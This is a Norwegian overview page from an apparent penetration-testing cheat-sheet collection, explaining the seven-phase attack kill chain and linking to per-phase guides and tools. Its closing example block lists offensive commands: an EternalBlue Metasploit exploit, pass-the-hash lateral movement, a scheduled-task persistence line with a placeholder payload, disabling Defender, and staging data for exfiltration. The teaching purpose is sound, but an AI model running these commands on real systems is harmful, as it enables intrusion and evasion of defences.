# 🎯 Angrepsmetodikk – Kill Chain

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

## 🎯 Hva er en angrepskjede (Attack Kill Chain)?

En **angrepskjede (Attack Kill Chain)** beskriver fasene en angriper går gjennom for å kompromittere og utnytte et målsystem eller nettverk. Originalen omtaler også **Cyber Kill Chain** og **MITRE ATT&CK** i denne sammenhengen.

> **Presisering:** ATT&CK er en kunnskapsbase over taktikker og teknikker, og er ikke et annet navn på Cyber Kill Chain. De sju fasene nedenfor er originalens pedagogiske inndeling. Se [MITRE ATT&CK](https://attack.mitre.org/).

---

## 📊 Faser i angrepskjeden

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                ANGREPSFORLØP                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │1. INNLEDENDE │───▶│2. OPPDAGELSE │───▶│    3. RETTIGHETS-    │        │
│   │   TILGANG    │    │ KARTLEGGING  │    │      ESKALERING      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │      4. LATERAL      │          │
│          │                               │      BEVEGELSE       │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │7. HANDLINGER │◀───│ 6. OMGÅELSE  │◀───│5. VEDVARENDE TILGANG │        │
│   │  MOT MÅLENE  │    │   AV VERN    │    │                      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Veiledninger for hver fase

| Fase | Beskrivelse | Veiledning |
|-------|-------------|-------|
| **1. Innledende tilgang** | Første fotfeste i målet | [📄 Vis](./01-Initial-Access.nb.md) |
| **2. Oppdagelse og kartlegging** | Samle informasjon om det kompromitterte systemet | [📄 Vis](./02-Enumeration.nb.md) |
| **3. Rettighetseskalering** | Eskalere rettigheter til administrator/root | [📄 Vis](./03-Privilege-Escalation.nb.md) |
| **4. Lateral bevegelse** | Bevege seg gjennom nettverket til andre systemer | [📄 Vis](./04-Lateral-Movement.nb.md) |
| **5. Vedvarende tilgang** | Opprettholde tilgang etter omstart eller oppdagelse | [📄 Vis](./05-Persistence.nb.md) |
| **6. Omgåelse av sikkerhetsmekanismer** | Omgå antivirus, EDR og sikkerhetsmekanismer | [📄 Vis](./06-Defense-Evasion.nb.md) |
| **7. Gjennomføring av målene** | Oppnå sluttmålet (eksfiltrering eller påvirkning) | [📄 Vis](./07-Actions-Objectives.nb.md) |

---

## 🔗 Relaterte hurtigguider

### Etter fase

| Fase | Relaterte verktøy |
|-------|---------------|
| Innledende tilgang | [Metasploit](../../Metasploit/README.md), [SQLMap](../../SQLMap/README.md), [Hydra](../../Hydra/README.md) |
| Kartlegging | [Nmap](../../Nmap/README.md), [BloodHound](../../BloodHound/README.md), [PowerView](../../PowerView/README.md) |
| Rettighetseskalering | [Linux-PrivEsc](../../Linux-PrivEsc/README.md), [Windows-PrivEsc](../../Windows-PrivEsc/README.md) |
| Lateral bevegelse | [Impacket](../../Impacket/README.md), [CrackMapExec](../../CrackMapExec/README.md), [Evil-WinRM](../../Evil-WinRM/README.md) |
| Vedvarende tilgang | [PowerShell](../../PowerShell/README.md), [Metasploit](../../Metasploit/README.md) |
| Omgåelse av sikkerhetsmekanismer | [Mimikatz](../../Mimikatz/README.md), [PowerShell](../../PowerShell/README.md) |
| Dataeksfiltrering | [Linux-Commands](../../Linux-Commands/README.md) |

---

## 📚 Kom i gang

### Typisk angrepsforløp

> **Merknad:** Eksemplet blander Windows- og Linux-verktøy og er ikke ett sammenhengende Bash-skript. `IEX(payload)` er en plassholder. `Compress-Archive` klargjør data, men overfører dem ikke.
```bash
# 1. Innledende tilgang – utnytt en sårbarhet
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Kartlegging – finn ut hva du har tilgang til
whoami /all
systeminfo
net user

# 3. Rettighetseskalering – få SYSTEM/root
.\winPEAS.exe

# 4. Lateral bevegelse – gå videre til andre systemer
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Vedvarende tilgang – oppretthold tilgangen
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Omgåelse av sikkerhetsmekanismer – deaktiver antivirus
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Gjennomføring av målene – eksfiltrer data
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 Ressurser

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 Følg angrepskjeden!</b><br>
  <i>Bare for autorisert penetrasjonstesting!</i>
</p>
